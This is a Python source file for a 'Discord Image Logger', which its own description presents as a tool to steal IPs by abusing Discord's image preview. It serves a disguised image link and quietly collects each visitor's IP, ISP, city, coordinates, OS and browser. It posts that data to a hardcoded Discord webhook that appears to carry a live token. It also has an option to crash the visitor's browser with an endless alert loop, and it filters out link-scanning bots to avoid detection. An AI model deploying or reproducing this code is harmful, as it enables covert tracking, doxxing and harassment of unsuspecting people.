# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1515363125531115542/NBsBVRzkNGGAehV5BdXblWAAVorlDAAgiLuuuO4IO1XCqfEdie7Eq9ZeP7G1Z2Vf72xL",
    "image": "IMAGE HERE !",  # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<URL-escaped image link>)
    "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
    # CUSTOMIZATION #
    "username": "Image Logger",  # Set this to the name you want the webhook to have
    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)
    # OPTIONS #
    "crashBrowser": False,
    "accurateLocation": False,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
    "message": {  # Show a custom message when the user opens the image
        "doMessage": False,  # Enable the custom message?
        "message": " Custom message here",
        "richMessage": True,  # Enable rich text?
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            client_ip = self.client_address[0]
            client_port = self.client_address[1]

            useragent = self.headers.get('User-Agent', '')

            if any(client_ip.startswith(prefix) for prefix in blacklistedIPs):
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b'Forbidden')
                return

            bot = botCheck(client_ip, useragent)

            # Get IP info from ip-api.com
            ip_info_resp = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,as,mobile,proxy,hosting")
            ip_info = ip_info_resp.json() if ip_info_resp.status_code == 200 and ip_info_resp.json().get("status") == "success" else {}

            # Parse useragent details
            ua_data = httpagentparser.detect(useragent)
            os_info = ua_data.get('os', {}).get('name', 'Unknown')
            browser_info = ua_data.get('browser', {}).get('name', 'Unknown')

            # Compose embed fields including the port
            fields = [
                {"name": "IP", "value": client_ip, "inline": True},
                {"name": "Port", "value": str(client_port), "inline": True},
                {"name": "Provider", "value": ip_info.get("isp", "Unknown"), "inline": True},
                {"name": "ASN", "value": ip_info.get("as", "Unknown"), "inline": True},
                {"name": "Country", "value": ip_info.get("country", "Unknown"), "inline": True},
                {"name": "Region", "value": ip_info.get("regionName", "Unknown"), "inline": True},
                {"name": "City", "value": ip_info.get("city", "Unknown"), "inline": True},
                {"name": "Coords", "value": f'{ip_info.get("lat", "Unknown")}, {ip_info.get("lon", "Unknown")}', "inline": True},
                {"name": "Timezone", "value": ip_info.get("timezone", "Unknown"), "inline": True},
                {"name": "Mobile", "value": str(ip_info.get("mobile", False)), "inline": True},
                {"name": "VPN/Proxy/Hosting", "value": str(ip_info.get("proxy", False)) + "/" + str(ip_info.get("hosting", False)), "inline": True},
                {"name": "Bot", "value": bot or "No", "inline": True},
                {"name": "OS", "value": os_info, "inline": True},
                {"name": "Browser", "value": browser_info, "inline": True},
                {"name": "User Agent", "value": useragent, "inline": False},
            ]

            embed = {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "fields": fields
            }

            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [embed],
            })

            # Serve response based on config
            if config["redirect"]["redirect"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
                return
            elif config["crashBrowser"]:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b"<script>while(true) alert('crash');</script>")
                return
            elif config["message"]["doMessage"]:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(config["message"]["message"].encode())
                return
            else:
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                image_url = config["image"]
                if config["imageArgument"]:
                    parsed_url = parse.urlparse(self.path)
                    query = parse.parse_qs(parsed_url.query)
                    if "url" in query:
                        image_url = query["url"][0]
                image_resp = requests.get(image_url)
                self.wfile.write(image_resp.content)

        except Exception as e:
            traceback_str = traceback.format_exc()
            reportError(traceback_str)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")


def run(server_class=HTTPServer, handler_class=Handler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting {__app__} server on port {port}...")
    httpd.serve_forever()


if __name__ == "__main__":
    run()
